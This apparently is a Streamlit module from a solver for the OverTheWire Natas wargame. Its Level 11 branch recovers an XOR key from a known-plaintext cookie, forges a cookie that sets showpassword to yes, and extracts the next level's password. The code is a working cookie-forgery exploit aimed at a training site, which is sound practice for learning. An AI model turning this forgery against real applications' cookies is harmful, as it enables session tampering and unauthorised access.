import streamlit as st
import importlib
import os
import base64
import re
from .utils import initialize_http_session

def execute(level_name, context):
    st.markdown(f"### 📋 Running: {level_name}")
    
    session = initialize_http_session(context)
    base_url = context['url'].rstrip('/')
    
    module_filename = level_name.lower().replace(" ", "")
    current_dir = os.path.dirname(__file__)
    
    # Target directory path for standalone level modules
    group2_dir_path = os.path.join(current_dir, "group_2")
    sub_module_path = os.path.join(group2_dir_path, f"{module_filename}.py")
    
    # ─── ROUTE TO STANDALONE MODULE IF IT EXISTS AND IS INITIALIZED ──────────
    # Check if the subdirectory exists and contains the initialization file
    if os.path.exists(sub_module_path) and os.path.exists(os.path.join(group2_dir_path, "__init__.py")):
        try:
            dynamic_path = f"modules.group_2.{module_filename}"
            target_module = importlib.import_module(dynamic_path)
            target_module.run(context, session, base_url)
            return
        except Exception as err:
            st.error(f"Failed to execute sub-module file: {str(err)}")
            return

    # ─── BACKWARD COMPATIBLE MONOLITHIC EMBEDDED ENGINE ──────────────────────
    # If the sub-folder files aren't ready yet, run the verified code right here!
    
    if level_name == "Level 11":
        st.info("Level 11 active: Processing token generation and state handling...")
        try:
            initial_response = session.get(base_url, timeout=10)
            default_json = '{"showpassword":"no","bgcolor":"#ffffff"}'
            default_cookie = session.cookies.get("data")
            
            if default_cookie:
                st.write(f"Captured Default Cookie: `{default_cookie}`")
                cipher_bytes = base64.b64decode(default_cookie.replace("%3D", "="))
                plain_bytes = default_json.encode('utf-8')
                key_pattern = bytes([p ^ c for p, c in zip(plain_bytes, cipher_bytes)])
                
                key_string = key_pattern[:4].decode('utf-8', errors='ignore')
                st.success(f"🔑 Derived Encryption Key Signature: `{key_string}`")
                
                target_json = '{"showpassword":"yes","bgcolor":"#ffffff"}'
                target_bytes = target_json.encode('utf-8')
                
                encrypted_bytes = bytearray()
                for i in range(len(target_bytes)):
                    key_char = key_string[i % len(key_string)]
                    encrypted_bytes.append(target_bytes[i] ^ ord(key_char))
                
                custom_cookie = base64.b64encode(bytes(encrypted_bytes)).decode('utf-8')
                session.cookies.set("data", custom_cookie, domain="natas11.natas.labs.overthewire.org")
                
                st.write("Transmitting custom session cookie state...")
                authenticated_response = session.get(base_url, timeout=10)
                
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', authenticated_response.text)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                
                if valid_tokens:
                    st.success("🎯 State check verified! Level 11 verification challenge resolved.")
                    st.code(f"Natas 12 Password: {valid_tokens[0]}")
                
                with st.expander("Inspect Raw Response Body"):
                    st.code(authenticated_response.text, language="html")
            else:
                st.warning("No tracking cookie discovered in headers. Double-check your active target credentials.")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    elif level_name in ["Level 12", "Level 13", "Level 14", "Level 15", "Level 16"]:
        st.info(f"Reviewing connection baseline configurations for {level_name}...")
        try:
            response = session.get(base_url, timeout=10)
            st.success("Connection parameters verified.")
            with st.expander("Inspect Raw Response Body"):
                st.code(response.text, language="html")
        except Exception as e:
            st.error(f"Error executing module: {str(e)}")